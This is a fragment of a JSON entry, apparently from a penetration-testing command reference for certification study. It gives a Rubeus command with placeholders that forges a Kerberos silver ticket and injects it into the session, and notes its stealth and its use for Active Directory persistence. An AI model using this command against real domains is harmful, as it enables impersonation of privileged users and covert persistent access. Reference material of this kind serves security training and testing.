      "id": "crtp-silver-ticket",
      "name": "Silver Ticket Attack (Rubeus)",
      "command": "Rubeus.exe silver /service:<spn> /rc4:<nt_hash> /sid:<domain_sid> /user:Administrator /domain:<domain> /ptt",
      "description": "Forge a TGS (Silver Ticket) for a specific service using the service account's NTLM hash. Bypasses KDC entirely — more stealthy than golden tickets.",
      "platform": "windows",
      "category": "Active Directory",
      "subcategory": "Persistence",
      "type": "command",
